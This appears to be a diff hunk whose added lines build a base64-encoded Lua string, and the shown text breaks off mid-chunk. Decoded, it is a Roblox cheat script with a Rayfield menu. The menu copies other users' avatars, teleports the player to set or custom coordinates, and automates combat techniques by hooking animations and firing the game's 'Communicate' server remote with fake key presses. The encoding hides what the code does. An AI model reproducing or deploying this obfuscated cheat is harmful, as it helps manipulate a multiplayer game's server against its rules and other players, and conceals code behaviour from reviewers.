+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tCi0tIOKVkOKVkOKVkCBUQUI6IEFWQVRBUiBMT0FERVIg4pWQ4pWQ4pWQCi0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KbG9jYWwg
+.."YXZhdGFyVGFiID0gV2luZG93OkNyZWF0ZVRhYigi8J+RpCBBdmF0YXIiLCAidXNlciIpCgpsb2NhbCBhdmF0YXJVc2VySWQgICA9
+.."ICIiCmxvY2FsIGF2YXRhckFwcGx5aW5nID0gZmFsc2UKCi0tIOKUgOKUgCBQdXJlIHZpc3VhbCBoZWxwZXJzIChubyBBcHBseURl
+.."c2NyaXB0aW9uIC8gc2VydmVyIGNhbGxzKSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAK
+.."Ci0tIFN0cmlwIGFsbCB2aXN1YWwgZGVjb3JhdGlvbnMgZnJvbSB0aGUgY2hhcmFjdGVyIChjbGllbnQtc2lkZSBvbmx5KQpsb2Nh
+.."bCBmdW5jdGlvbiBjbGVhclZpc3VhbHMoY2hhcikKICAgIGZvciBfLCBjIGluIGlwYWlycyhjaGFyOkdldENoaWxkcmVuKCkpIGRv
+.."CiAgICAgICAgaWYgYzpJc0EoIkFjY2Vzc29yeSIpIG9yIGM6SXNBKCJIYXQiKSBvciBjOklzQSgiU2hpcnQiKSBvcgogICAgICAg
+.."ICAgIGM6SXNBKCJQYW50cyIpIG9yIGM6SXNBKCJTaGlydEdyYXBoaWMiKSBvciBjOklzQSgiQ2hhcmFjdGVyTWVzaCIpIHRoZW4K
+.."ICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBjOkRlc3Ryb3koKSBlbmQpCiAgICAgICAgZW5kCiAgICBlbmQKICAgIC0tIFJl
+.."bW92ZSBmYWNlIGRlY2FsIGZyb20gSGVhZAogICAgbG9jYWwgaGVhZCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAg
+.."aWYgaGVhZCB0aGVuCiAgICAgICAgZm9yIF8sIGQgaW4gaXBhaXJzKGhlYWQ6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAg
+.."aWYgZDpJc0EoIkRlY2FsIikgYW5kIGQuTmFtZTpsb3dlcigpID09ICJmYWNlIiB0aGVuCiAgICAgICAgICAgICAgICBwY2FsbChm
+.."dW5jdGlvbigpIGQ6RGVzdHJveSgpIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIC0tIFJlbW92
+.."ZSBCb2R5Q29sb3JzIHNvIHNraW4gY29sb3VyIGlzIGZ1bGx5IHJlcGxhY2VkCiAgICBsb2NhbCBiYyA9IGNoYXI6RmluZEZpcnN0
+.."Q2hpbGRPZkNsYXNzKCJCb2R5Q29sb3JzIikKICAgIGlmIGJjIHRoZW4gcGNhbGwoZnVuY3Rpb24oKSBiYzpEZXN0cm95KCkgZW5k
+.."KSBlbmQKZW5kCgotLSBBdHRhY2ggYW4gYWNjZXNzb3J5IHZpc3VhbGx5IHVzaW5nIFdlbGRDb25zdHJhaW50ICsgQXR0YWNobWVu
+.."dCBuYW1lIG1hdGNoaW5nCmxvY2FsIGZ1bmN0aW9uIGF0dGFjaEFjY2Vzc29yeShjaGFyLCBhY2Nlc3NvcnkpCiAgICBsb2NhbCBo
+.."YW5kbGUgPSBhY2Nlc3Nvcnk6RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpCiAgICBpZiBub3QgaGFuZGxlIHRoZW4gcmV0dXJuIGVu
+.."ZAogICAgbG9jYWwgdGFyZ2V0QXR0LCBhY2NBdHQKICAgIGZvciBfLCBwYXJ0IGluIGlwYWlycyhjaGFyOkdldENoaWxkcmVuKCkp
+.."IGRvCiAgICAgICAgaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICBmb3IgXywgYXR0IGluIGlwYWlycyhw
+.."YXJ0OkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICBpZiBhdHQ6SXNBKCJBdHRhY2htZW50IikgdGhlbgogICAgICAg
+.."ICAgICAgICAgICAgIGxvY2FsIG1hdGNoID0gaGFuZGxlOkZpbmRGaXJzdENoaWxkKGF0dC5OYW1lKQogICAgICAgICAgICAgICAg
+.."ICAgIGlmIG1hdGNoIGFuZCBtYXRjaDpJc0EoIkF0dGFjaG1lbnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdl
+.."dEF0dCA9IGF0dAogICAgICAgICAgICAgICAgICAgICAgICBhY2NBdHQgICAgPSBtYXRjaAogICAgICAgICAgICAgICAgICAgICAg
+.."ICBicmVhawogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAg
+.."IGVuZAogICAgICAgIGlmIHRhcmdldEF0dCB0aGVuIGJyZWFrIGVuZAogICAgZW5kCiAgICBpZiB0YXJnZXRBdHQgYW5kIGFjY0F0
+.."dCB0aGVuCiAgICAgICAgaGFuZGxlLkNGcmFtZSA9IHRhcmdldEF0dC5Xb3JsZENGcmFtZSAqIGFjY0F0dC5DRnJhbWU6SW52ZXJz
+.."ZSgpCiAgICBlbHNlCiAgICAgICAgbG9jYWwgcm9vdCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQog
+.."ICAgICAgIGlmIHJvb3QgdGhlbiBoYW5kbGUuQ0ZyYW1lID0gcm9vdC5DRnJhbWUgZW5kCiAgICBlbmQKICAgIGxvY2FsIHdlbGQg
+.."ICA9IEluc3RhbmNlLm5ldygiV2VsZENvbnN0cmFpbnQiKQogICAgd2VsZC5QYXJ0MCAgID0gaGFuZGxlCiAgICB3ZWxkLlBhcnQx
+.."ICAgPSAodGFyZ2V0QXR0IGFuZCB0YXJnZXRBdHQuUGFyZW50KQogICAgICAgICAgICAgICAgb3IgY2hhcjpGaW5kRmlyc3RDaGls
+.."ZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICBvciBjaGFyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgIHdl
+.."bGQuUGFyZW50ICA9IGhhbmRsZQogICAgYWNjZXNzb3J5LlBhcmVudCA9IGNoYXIKZW5kCgotLSBBcHBseSBhcHBlYXJhbmNlIGZy
+.."b20gYW55IHVzZXJJZCDigJQgcHVyZWx5IHZpc3VhbCwgbm8gc2VydmVyIHNpZGUtZWZmZWN0cwpsb2NhbCBmdW5jdGlvbiBhcHBs
+.."eVZpc3VhbCh1c2VySWQpCiAgICBpZiBhdmF0YXJBcHBseWluZyB0aGVuCiAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsgVGl0bGU9
+.."IkF2YXRhciIsIENvbnRlbnQ9IkFscmVhZHkgYXBwbHlpbmcsIHBsZWFzZSB3YWl0Li4uIiwgRHVyYXRpb249MiwgSW1hZ2U9NDQ4
+.."MzM2MjQ1OCB9KQogICAgICAgIHJldHVybgogICAgZW5kCiAgICBhdmF0YXJBcHBseWluZyA9IHRydWUKICAgIFJheWZpZWxkOk5v
+.."dGlmeSh7IFRpdGxlPSJBdmF0YXIiLCBDb250ZW50PSJMb2FkaW5nIGFwcGVhcmFuY2UuLi4iLCBEdXJhdGlvbj0yLCBJbWFnZT00
+.."NDgzMzYyNDU4IH0pCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBjaGFyID0gTG9jYWxQbGF5ZXIuQ2hh
+.."cmFjdGVyCiAgICAgICAgaWYgbm90IGNoYXIgb3Igbm90IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0
+.."aGVuCiAgICAgICAgICAgIGF2YXRhckFwcGx5aW5nID0gZmFsc2UKICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsgVGl0bGU9
+.."IkF2YXRhciIsIENvbnRlbnQ9Ik5vIGNoYXJhY3RlciEiLCBEdXJhdGlvbj0zLCBJbWFnZT00NDgzMzYyNDU4IH0pCiAgICAgICAg
+.."ICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIGxvY2FsIG9rLCBtb2RlbCA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAg
+.."ICAgcmV0dXJuIFBsYXllcnM6R2V0Q2hhcmFjdGVyQXBwZWFyYW5jZUFzeW5jKHVzZXJJZCkKICAgICAgICBlbmQpCiAgICAgICAg
+.."aWYgbm90IG9rIG9yIG5vdCBtb2RlbCB0aGVuCiAgICAgICAgICAgIGF2YXRhckFwcGx5aW5nID0gZmFsc2UKICAgICAgICAgICAg
+.."UmF5ZmllbGQ6Tm90aWZ5KHsgVGl0bGU9IkF2YXRhciIsIENvbnRlbnQ9IkZhaWxlZCB0byBsb2FkIGFwcGVhcmFuY2UhIiwgRHVy
+.."YXRpb249NCwgSW1hZ2U9NDQ4MzM2MjQ1OCB9KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICBjbGVhclZp
+.."c3VhbHMoY2hhcikKICAgICAgICAtLSBCb2R5IGNvbG91cnMKICAgICAgICBsb2NhbCBiYyA9IG1vZGVsOkZpbmRGaXJzdENoaWxk
+.."T2ZDbGFzcygiQm9keUNvbG9ycyIpCiAgICAgICAgaWYgYmMgdGhlbiBiYzpDbG9uZSgpLlBhcmVudCA9IGNoYXIgZW5kCiAgICAg
+.."ICAgLS0gQ2xvdGhpbmcKICAgICAgICBmb3IgXywgaXRlbSBpbiBpcGFpcnMobW9kZWw6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAg
+.."ICAgICAgaWYgaXRlbTpJc0EoIlNoaXJ0Iikgb3IgaXRlbTpJc0EoIlBhbnRzIikgb3IgaXRlbTpJc0EoIlNoaXJ0R3JhcGhpYyIp
+.."IHRoZW4KICAgICAgICAgICAgICAgIGl0ZW06Q2xvbmUoKS5QYXJlbnQgPSBjaGFyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVu
+.."ZAogICAgICAgIC0tIEFjY2Vzc29yaWVzIChXZWxkQ29uc3RyYWludC1iYXNlZCB2aXN1YWwgYXR0YWNobWVudCkKICAgICAgICBm
+.."b3IgXywgYWNjIGluIGlwYWlycyhtb2RlbDpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiBhY2M6SXNBKCJBY2Nlc3Nv
+.."cnkiKSBvciBhY2M6SXNBKCJIYXQiKSB0aGVuCiAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIGF0dGFjaEFjY2Vzc29y
+.."eShjaGFyLCBhY2M6Q2xvbmUoKSkgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAtLSBGYWNlIGRlY2Fs
+.."CiAgICAgICAgbG9jYWwgaGVhZCA9IGNoYXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKQogICAgICAgIGlmIGhlYWQgdGhlbgogICAg
+.."ICAgICAgICBsb2NhbCBmYWNlID0gbW9kZWw6RmluZEZpcnN0Q2hpbGQoImZhY2UiLCB0cnVlKQogICAgICAgICAgICBpZiBmYWNl
+.."IGFuZCBmYWNlOklzQSgiRGVjYWwiKSB0aGVuIGZhY2U6Q2xvbmUoKS5QYXJlbnQgPSBoZWFkIGVuZAogICAgICAgIGVuZAogICAg
+.."ICAgIG1vZGVsOkRlc3Ryb3koKQogICAgICAgIGF2YXRhckFwcGx5aW5nID0gZmFsc2UKICAgICAgICBSYXlmaWVsZDpOb3RpZnko
+.."eyBUaXRsZT0iQXZhdGFyIiwgQ29udGVudD0iU2tpbiBhcHBsaWVkISIsIER1cmF0aW9uPTMsIEltYWdlPTQ0ODMzNjI0NTggfSkK
+.."ICAgIGVuZCkKZW5kCgotLSDilIDilIAgQXZhdGFyIHRhYiBVSSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKCmF2YXRh
+.."clRhYjpDcmVhdGVTZWN0aW9uKCLimqAgV2FybmluZyIpCmF2YXRhclRhYjpDcmVhdGVMYWJlbCgiVG8gYXZvaWQgYnVncywgcmVt
+.."b3ZlIGFsbCBhY2Nlc3NvcmllcyBmcm9tIHlvdXIgYXZhdGFyIGJlZm9yZSBhcHBseWluZyBhIHNraW4uIikKCmF2YXRhclRhYjpD
+.."cmVhdGVTZWN0aW9uKCJMb2FkIEF2YXRhciBieSBVc2VyIElEIikKYXZhdGFyVGFiOkNyZWF0ZUlucHV0KHsKICAgIE5hbWUgICAg
+.."ICAgICAgICAgICAgICAgICA9ICJVc2VyIElEIiwKICAgIFBsYWNlaG9sZGVyVGV4dCAgICAgICAgICA9ICJlLmcuIDEyMzQ1Njc4
+.."OTAiLAogICAgRmxhZyAgICAgICAgICAgICAgICAgICAgID0gIkF2YXRhclVzZXJJZCIsCiAgICBSZW1vdmVUZXh0QWZ0ZXJGb2N1
+.."c0xvc3QgPSBmYWxzZSwKICAgIENhbGxiYWNrICAgICAgICAgICAgICAgICA9IGZ1bmN0aW9uKHYpIGF2YXRhclVzZXJJZCA9IHYg
+.."ZW5kLAp9KQoKYXZhdGFyVGFiOkNyZWF0ZUJ1dHRvbih7CiAgICBOYW1lID0gIkFwcGx5IFNraW4iLAogICAgQ2FsbGJhY2sgPSBm
+.."dW5jdGlvbigpCiAgICAgICAgbG9jYWwgdWlkID0gdG9udW1iZXIoYXZhdGFyVXNlcklkKQogICAgICAgIGlmIG5vdCB1aWQgdGhl
+.."bgogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoeyBUaXRsZT0iQXZhdGFyIiwgQ29udGVudD0iSW52YWxpZCBVc2VyIElEISIs
+.."IER1cmF0aW9uPTMsIEltYWdlPTQ0ODMzNjI0NTggfSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgYXBw
+.."bHlWaXN1YWwodWlkKQogICAgZW5kLAp9KQoKYXZhdGFyVGFiOkNyZWF0ZUJ1dHRvbih7CiAgICBOYW1lID0gIlJlc2V0IEF2YXRh
+.."ciIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICAtLSBSZS1hcHBsaWVzIHRoZSBwbGF5ZXIncyBvd24gYXBwZWFy
+.."YW5jZSB1c2luZyB0aGUgc2FtZSB2aXN1YWwgcGF0aAogICAgICAgIGFwcGx5VmlzdWFsKExvY2FsUGxheWVyLlVzZXJJZCkKICAg
+.."IGVuZCwKfSkKCgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tCi0tIOKVkOKVkOKVkCBUQUI6IFRFTEVQT1JUIOKVkOKVkOKVkAotLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCmxvY2FsIHRwVGFiID0gV2lu
+.."ZG93OkNyZWF0ZVRhYigi8J+MjSBUZWxlcG9ydCIsICJtYXAtcGluIikKCnRwVGFiOkNyZWF0ZVNlY3Rpb24oIkxvY2F0aW9ucyIp
+.."Cgpsb2NhbCBMb2NhdGlvbnMgPSB7CiAgICB7IG5hbWU9Ik1pZGRsZSAoQ2VudHJlIE1hcCkiLCAgICBwb3M9Q0ZyYW1lLm5ldygx
+.."NDgsIDQ0MSwgMjcpICAgICAgIH0sCiAgICB7IG5hbWU9IkRlYXRoIENvdW50ZXIgUm9vbSIsICAgICBwb3M9Q0ZyYW1lLm5ldygt
+.."OTIsIDI5LCAyMDM0NykgICAgIH0sCiAgICB7IG5hbWU9Ik1vdW50YWluIDEiLCAgICAgICAgICAgICBwb3M9Q0ZyYW1lLm5ldygy
+.."NjYsIDY5OSwgNDU4KSAgICAgIH0sCn0KCmZvciBfLCBsb2MgaW4gaXBhaXJzKExvY2F0aW9ucykgZG8KICAgIHRwVGFiOkNyZWF0
+.."ZUJ1dHRvbih7CiAgICAgICAgTmFtZSA9IGxvYy5uYW1lLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgICAg
+.."ICBpZiBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gbG9jLnBv
+.."cwogICAgICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgICAgICBUaXRsZSAgID0gIlRlbGVwb3J0
+.."IiwKICAgICAgICAgICAgICAgICAgICBDb250ZW50ID0gIuKGkiAiIC4uIGxvYy5uYW1lLAogICAgICAgICAgICAgICAgICAgIER1
+.."cmF0aW9uID0gMiwKICAgICAgICAgICAgICAgICAgICBJbWFnZSAgID0gNDQ4MzM2MjQ1OCwKICAgICAgICAgICAgICAgIH0pCiAg
+.."ICAgICAgICAgIGVuZAogICAgICAgIGVuZCwKICAgIH0pCmVuZAoKdHBUYWI6Q3JlYXRlU2VjdGlvbigiQ3VzdG9tIFBvc2l0aW9u
+.."IikKbG9jYWwgY3VzdG9tWCwgY3VzdG9tWSwgY3VzdG9tWiA9IDAsIDAsIDAKdHBUYWI6Q3JlYXRlSW5wdXQoeyBOYW1lPSJYIiwg
+.."UGxhY2Vob2xkZXJUZXh0PSIwIiwgRmxhZz0iVHBYIiwgUmVtb3ZlVGV4dEFmdGVyRm9jdXNMb3N0PWZhbHNlLAogICAgQ2FsbGJh
+.."Y2s9ZnVuY3Rpb24odikgY3VzdG9tWCA9IHRvbnVtYmVyKHYpIG9yIDAgZW5kIH0pCnRwVGFiOkNyZWF0ZUlucHV0KHsgTmFtZT0i
+.."WSIsIFBsYWNlaG9sZGVyVGV4dD0iMCIsIEZsYWc9IlRwWSIsIFJlbW92ZVRleHRBZnRlckZvY3VzTG9zdD1mYWxzZSwKICAgIENh
+.."bGxiYWNrPWZ1bmN0aW9uKHYpIGN1c3RvbVkgPSB0b251bWJlcih2KSBvciAwIGVuZCB9KQp0cFRhYjpDcmVhdGVJbnB1dCh7IE5h
+.."bWU9IloiLCBQbGFjZWhvbGRlclRleHQ9IjAiLCBGbGFnPSJUcFoiLCBSZW1vdmVUZXh0QWZ0ZXJGb2N1c0xvc3Q9ZmFsc2UsCiAg
+.."ICBDYWxsYmFjaz1mdW5jdGlvbih2KSBjdXN0b21aID0gdG9udW1iZXIodikgb3IgMCBlbmQgfSkKdHBUYWI6Q3JlYXRlQnV0dG9u
+.."KHsKICAgIE5hbWUgPSAiVGVsZXBvcnQgdG8gQ29vcmRpbmF0ZXMiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAg
+.."aWYgaHVtYW5vaWRSb290UGFydCB0aGVuCiAgICAgICAgICAgIGh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhj
+.."dXN0b21YLCBjdXN0b21ZLCBjdXN0b21aKQogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoeyBUaXRsZT0iVGVsZXBvcnQiLCBD
+.."b250ZW50PWN1c3RvbVguLiIsICIuLmN1c3RvbVkuLiIsICIuLmN1c3RvbVosIER1cmF0aW9uPTIsIEltYWdlPTQ0ODMzNjI0NTgg
+.."fSkKICAgICAgICBlbmQKICAgIGVuZCwKfSkKCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0g4pWQ4pWQ4pWQIFRBQjogQVVUTyBURUNIIOKVkOKVkOKVkAotLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."CmxvY2FsIGF1dG9UZWNoVGFiID0gV2luZG93OkNyZWF0ZVRhYigi4pqhIEF1dG9UZWNoIiwgInphcCIpCgotLSBTaGFyZWQgYW5p
+.."bWF0aW9uIGhvb2sgaGVscGVyIChyZS1ob29rcyBvbiByZXNwYXduKQpsb2NhbCBmdW5jdGlvbiBob29rQW5pbWF0aW9uKGFuaW1J
+.."ZCwgY2FsbGJhY2spCiAgICBsb2NhbCBpZCA9IHRvc3RyaW5nKGFuaW1JZCk6Z3N1YigicmJ4YXNzZXRpZDovLyIsICIiKQogICAg
+.."bG9jYWwgZnVuY3Rpb24gaG9va0NoYXIoY2hhcikKICAgICAgICBsb2NhbCBodW0gPSBjaGFyOkZpbmRGaXJzdENoaWxkV2hpY2hJ
+.."c0EoIkh1bWFub2lkIikKICAgICAgICAgICAgb3IgY2hhcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkIiwgMykKICAgICAgICBpZiBu
+.."b3QgaHVtIHRoZW4gcmV0dXJuIGVuZAogICAgICAgIGh1bS5BbmltYXRpb25QbGF5ZWQ6Q29ubmVjdChmdW5jdGlvbih0cmFjaykK
+.."ICAgICAgICAgICAgbG9jYWwgcmF3ID0gdHJhY2suQW5pbWF0aW9uIGFuZCB0cmFjay5BbmltYXRpb24uQW5pbWF0aW9uSWQgb3Ig
+.."IiIKICAgICAgICAgICAgaWYgdG9zdHJpbmcocmF3KTpnc3ViKCJyYnhhc3NldGlkOi8vIiwgIiIpID09IGlkIHRoZW4KICAgICAg
+.."ICAgICAgICAgIGNhbGxiYWNrKHRyYWNrLCBjaGFyKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKICAgIGlm
+.."IExvY2FsUGxheWVyLkNoYXJhY3RlciB0aGVuIGhvb2tDaGFyKExvY2FsUGxheWVyLkNoYXJhY3RlcikgZW5kCiAgICBMb2NhbFBs
+.."YXllci5DaGFyYWN0ZXJBZGRlZDpDb25uZWN0KGhvb2tDaGFyKQplbmQKCi0tIOKUgOKUgCAxLiBGbG93aW5nIFdhdGVyICsgRGFz
+.."aCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIAKYXV0b1RlY2hUYWI6Q3JlYXRlU2VjdGlvbigiQ29tYmF0IFRlY2hzIikKCmxvY2FsIGZsb3dpbmdFbmFibGVkID0gZmFsc2UK
+.."YXV0b1RlY2hUYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgICAgICAgICA9ICJGbG93aW5nIFdhdGVyICsgRGFzaCIsCiAgICBD
+.."dXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgICAgICAgICA9ICJBdXRvRmxvd2luZyIsCiAgICBDYWxsYmFjayAgICAgPSBm
+.."dW5jdGlvbih2KSBmbG93aW5nRW5hYmxlZCA9IHYgZW5kLAp9KQoKaG9va0FuaW1hdGlvbigiMTIyNzMxODg3NTQiLCBmdW5jdGlv
+.."bih0cmFjaywgY2hhcikKICAgIGlmIG5vdCBmbG93aW5nRW5hYmxlZCB0aGVuIHJldHVybiBlbmQKICAgIGxvY2FsIGNvbW0gPSBj
+.."aGFyOkZpbmRGaXJzdENoaWxkKCJDb21tdW5pY2F0ZSIpCiAgICBpZiBub3QgY29tbSB0aGVuIHJldHVybiBlbmQKICAgIHRhc2su
+.."d2FpdCgxLjU3KQogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGNvbW06RmlyZVNlcnZlcih7IERhc2ggPSBFbnVtLktleUNv
+.."ZGUuVywgS2V5ID0gRW51bS5LZXlDb2RlLlEsIEdvYWwgPSAiS2V5UHJlc3MiIH0pCiAgICBlbmQpCmVuZCkKCi0tIOKUgOKUgCAy
+.."LiBBdXRvIEt5b3RvIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgApsb2NhbCBreW90b0VuYWJsZWQgPSBmYWxzZQphdXRv
+.."VGVjaFRhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSAgICAgICAgID0gIkF1dG8gS3lvdG8iLAogICAgQ3VycmVudFZhbHVlID0g
+.."ZmFsc2UsCiAgICBGbGFnICAgICAgICAgPSAiQXV0b0t5b3RvIiwKICAgIENhbGxiYWNrICAgICA9IGZ1bmN0aW9uKHYpIGt5b3Rv
+.."RW5hYmxlZCA9IHYgZW5kLAp9KQoKaG9va0FuaW1hdGlvbigiMTIyNzMxODg3NTQiLCBmdW5jdGlvbih0cmFjaywgY2hhcikKICAg
+.."IGlmIG5vdCBreW90b0VuYWJsZWQgdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBjb21tID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgi
+.."Q29tbXVuaWNhdGUiKQogICAgaWYgbm90IGNvbW0gdGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCB0b29sID0gTG9jYWxQbGF5ZXIu
+.."QmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkxldGhhbCBXaGlybHdpbmQgU3RyZWFtIikKICAgICAgICBvciAoTG9jYWxQbGF5ZXIu
+.."Q2hhcmFjdGVyIGFuZCBMb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkxldGhhbCBXaGlybHdpbmQgU3RyZWFt
+.."IikpCiAgICBpZiBub3QgdG9vbCB0aGVuIHJldHVybiBlbmQKICAgIHRhc2sud2FpdCgxLjQ5KQogICAgcGNhbGwoZnVuY3Rpb24o
+.."KQogICAgICAgIGNvbW06RmlyZVNlcnZlcih7IFRvb2wgPSB0b29sLCBHb2FsID0gIkNvbnNvbGUgTW92ZSIgfSkKICAgICAgICBs
+.."b2NhbCBocnAgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICBpZiBocnAgdGhlbiBocnAu
+.."Q0ZyYW1lID0gaHJwLkNGcmFtZSArIGhycC5DRnJhbWUuTG9va1ZlY3RvciAqIDE2IGVuZAogICAgZW5kKQplbmQpCgotLSDilIDi
+.."lIAgMy4gU2t5IFVwcGVyIERhc2gg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACmxvY2FsIHNreUVuYWJsZWQgPSBmYWxzZQphdXRvVGVjaFRh
+.."YjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSAgICAgICAgID0gIlNreSBVcHBlciBEYXNoIiwKICAgIEN1cnJlbnRWYWx1ZSA9IGZh
+.."bHNlLAogICAgRmxhZyAgICAgICAgID0gIkF1dG9Ta3lEYXNoIiwKICAgIENhbGxiYWNrICAgICA9IGZ1bmN0aW9uKHYpIHNreUVu
+.."YWJsZWQgPSB2IGVuZCwKfSkKCmhvb2tBbmltYXRpb24oIjEwNTAzMzgxMjM4IiwgZnVuY3Rpb24odHJhY2ssIGNoYXIpCiAgICBp
+.."ZiBub3Qgc2t5RW5hYmxlZCB0aGVuIHJldHVybiBlbmQKICAgIGxvY2FsIGNvbW0gPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJDb21t
+.."dW5pY2F0ZSIpCiAgICBsb2NhbCByb290ID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBu
+.."b3QgY29tbSBvciBub3Qgcm9vdCB0aGVuIHJldHVybiBlbmQKICAgIHRhc2sud2FpdCgwLjUpCiAgICBwY2FsbChmdW5jdGlvbigp
+.."CiAgICAgICAgcm9vdC5DRnJhbWUgPSByb290LkNGcmFtZSArIFZlY3RvcjMubmV3KDAsIDUsIDApCiAgICAgICAgY29tbTpGaXJl
+.."U2VydmVyKHsgRGFzaCA9IEVudW0uS2V5Q29kZS5XLCBLZXkgPSBFbnVtLktleUNvZGUuUSwgR29hbCA9ICJLZXlQcmVzcyIgfSkK
+.."ICAgICAgICByb290LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIHJvb3QuQW5jaG9yZWQgPSBm
